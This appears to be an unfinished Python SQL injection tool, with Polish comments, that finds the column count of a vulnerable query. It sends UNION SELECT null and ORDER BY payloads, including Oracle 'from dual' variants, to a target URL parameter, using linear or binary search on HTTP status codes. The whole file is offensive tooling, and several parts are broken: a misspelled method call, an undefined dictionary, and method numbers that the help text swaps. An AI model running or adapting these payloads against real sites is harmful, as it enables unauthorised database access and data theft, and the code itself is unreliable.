import requests
import urllib
import argparse
from colorama import Style, Fore


class AmountOfColumnsFinder:
    __amount_of_columns = 0
    __url = ''
    __db_exploit = ''
    __oracle_exploit = ''
    __param_name = ''
    __bs_orderby_int = int(0)

    def __init__(self, url, param_name, amount_of_columns, method=1):
        self.vars_validation(url, amount_of_columns, method)
        self.__method = method
        self.__amount_of_columns = amount_of_columns
        self.__url = url
        self.__param_name = param_name
        self.configure_exploit()

    def vars_validation(self, url, amount_of_columns, method):
        if 'http' not in url:
            self.print_red('[-] Wrong url format!')
            exit()

        if method != 1 and method != 2:
            self.print_red("[-] Wrong method!")
            exit()

        try:
            if amount_of_columns <= 0:
                self.print_red("[-] Amount of columns has to be greater then 0.\n[*] Exiting...")
                exit()
        except Exception as e:
            self.print_red("[-] Amount of columns has to be greater then 0.\n[*] Exiting...")
            exit()

    ''' Run '''

    # Do przebudowania
    def queue_method(self):
        for i in range(self.__amount_of_columns):
            db_code = self.make_request_db()
            oracle_code = self.make_request_oracle()
            if db_code == 200 or oracle_code == 200:
                self.print_green(f'[+] Amount of columns: {i + 1}')
                exit()
            self.add_nulls()

        self.print_red('[-] Amount of columns not found.')
        exit()

    ''' 
    ##################################################################################################################
    '''

    '''
    TO DO:
     - zobaczyc jak wyglada response od order_by ze zbyt mala ilosc kolumn z zapytanie do zlej bazy danych 
     - reuesty do bazy oracle
    '''

    ''' Binary search algoruthm methods '''

    def binary_search_method(self) -> None:
        self.bs_payload()
        previous = self.__amount_of_columns
        self.__bs_orderby_int = int(self.__amount_of_columns / 2) + int(self.__amount_of_columns % 2)
        db_resp = 0
        oracle_resp = 0
        while True:
            self.bs_payload()
            additional_arg = self.__bs_orderby_int % 2

            code1 = self.make_request_db()
            code2 = self.make_request_oracle()

            # print(Fore.BLUE, f'[*] Current value: {self.__bs_orderby_int} DBr: {code1} ORr {code2}', Style.RESET_ALL)
            if self.is_equal(code1, code2):
                print(Fore.GREEN, f'[+] The numeber of columns is: {self.__bs_orderby_int}', Style.RESET_ALL)
                exit()
            elif code1 != 200 and code2 != 200:
                tmp_previous = self.__bs_orderby_int
                self.__bs_orderby_int -= int(abs(previous - self.__bs_orderby_int) / 2) + additional_arg
                previous = tmp_previous
            else:
                tmp_previous = self.__bs_orderby_int
                self.__bs_orderby_int = int(
                    abs(previous - self.__bs_orderby_int) / 2) + additional_arg + self.__bs_orderby_int
                previous = tmp_previous

    def is_equal(self, code1, code2) -> bool:
        if code1 == 200 or code2 == 200:
            self.__bs_orderby_int += 1
            c1 = self.make_request_db()
            c2 = self.make_request_oracle()
            if c1 == 200 or c2 == 200:
                return True
        return False

    def bs_payload(self) -> None:
        tmp_request = '\' order by '
        comment = '-- -'
        self.__db_exploit = tmp_request + str(self.__bs_orderby_int) + comment

    def bs_request(self, final_url) -> str:
        response = requests.get(final_url)
        self.print_green(response)

    def test_bs_tun(self) -> None:
        self.binary_search_method()
        # self.print_green(self.bs_payload())
        # self.bs_change_columns()
        # self.print_green(self.encode_url(self.bs_payload()))
        # tmp_url = self.encode_url(self.bs_payload())
        # self.bs_request(tmp_url)
        # self.__bs_orderby_int = 0
        # self.bs_payload()
        # print(self.__db_exploit)
        # self.__bs_orderby_int = 10
        # self.bs_payload()
        # print(self.__db_exploit)

    ''' 
    ##################################################################################################################
    '''

    def run(self):
        if self.__method == 1:
            self.queue_method()
        else:
            self.binary_serach_method()

    def test_run(self):
        self.show_data()
        self.make_request()
        self.add_nulls()
        self.make_request()
        self.add_nulls()
        self.make_request()

    def test_data_run(self):
        self.show_data()
        self.configure_exploit()
        self.add_nulls()
        self.show_data()

    ''' Data '''

    def configure_params(self, param_name, params_values):
        if len(param_name) != len(params_values):
            self.print_red('[-] Error occurred!. Amount of parameters names is different from amount of values!')
            self.print_red('[*] Exiting... ')
            exit()
        for i in range(0, len(param_name)):
            self.__params_dict[param_name[i]] = params_values[i]

    def show_data(self):
        self.print_green(f'Url: {self.__url}')
        self.print_green(f'Amount of columns: {self.__amount_of_columns}')
        self.print_red(f'DB exploit: {self.__db_exploit}')
        self.print_red(f'DB oracle exploit: {self.__oracle_exploit}')

    ''' Actual script '''

    def make_request_db(self) -> str:
        # print(Fore.RED, self.encode_db_url(), Style.RESET_ALL)
        response = requests.get(self.encode_db_url())
        return response.status_code

    def make_request_oracle(self) -> str:
        response = requests.get(self.encode_oracle_url())
        return response.status_code
        # return str(response_oracle.status_code)+str(response_db.status_code)

    def encode_url(self, url_to_encode) -> str():
        url_to_encode = self.__url + self.__param_name + '=' + urllib.parse.quote(url_to_encode)
        if '%27' in url_to_encode:
            url_to_encode = url_to_encode.replace('%27', '\'')
        return url_to_encode

    def encode_db_url(self) -> str:
        ''' Url encoding for a non oracle db '''
        complete_db_url = self.__url
        complete_oracle_url = self.__url
        complete_db_url += self.__param_name + '=' + urllib.parse.quote(self.__db_exploit)
        complete_oracle_url += self.__param_name + '=' + urllib.parse.quote(self.__oracle_exploit)

        if '%27' in complete_db_url:
            complete_db_url = complete_db_url.replace('%27', '\'')
        return complete_db_url

    def encode_oracle_url(self):
        ''' Url encoding for an oracle db '''
        complete_oracle_url = self.__url
        complete_oracle_url += self.__param_name + '=' + urllib.parse.quote(self.__oracle_exploit)

        if '%27' in complete_oracle_url:
            complete_oracle_url = complete_oracle_url.replace('%27', '\'')
        return complete_oracle_url

    def configure_exploit(self):
        dbnull = 'null'
        oracle_null = 'null from dual'
        comment = '-- -'
        exploit_db = f'\' and 1=0 union select -- -'
        exploit_oracle_db = f'\' and 1=0 union select -- -'

        self.__oracle_exploit = exploit_db[:-4] + oracle_null + comment
        self.__db_exploit = exploit_oracle_db[:-4] + dbnull + comment

    def add_nulls(self):
        dbnull = ',null'
        oracle_null = ',null from dual'  # 10
        comment = '-- -'

        self.__db_exploit = self.__db_exploit[:-4] + dbnull + comment
        self.__oracle_exploit = self.__oracle_exploit[:-14] + oracle_null + comment

    def print_red(self, message):
        print(Fore.RED, message, Style.RESET_ALL)

    def print_green(self, message):
        print(Fore.GREEN, message, Style.RESET_ALL)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Finding amount of columns.')
    parser.add_argument('--url', '-u', type=str, nargs=1, help='Provide a clean url without any parameters.')
    parser.add_argument('--param_name', '-pn', nargs=1, type=str,
                        help='Provide names of parameters and then remeber to add values For parameters. For more help type python3 <filename> --help.\n')
    parser.add_argument('--amount_of_columns', '-ac', nargs=1, type=int, help='Please provide a number of columns.')
    parser.add_argument('--method', '-m', type=int, nargs=1,
                        help='Please provide the methos: binary search (1) or brute search (2)')
    args = parser.parse_args()

    # bs = AmountOfColumns(args.url[0], args.param_name[0], args.amount_of_columns[0], args.method[0])
    bs = AmountOfColumnsFinder(args.url[0], args.param_name[0], args.amount_of_columns[0])
    bs.test_bs_tun()
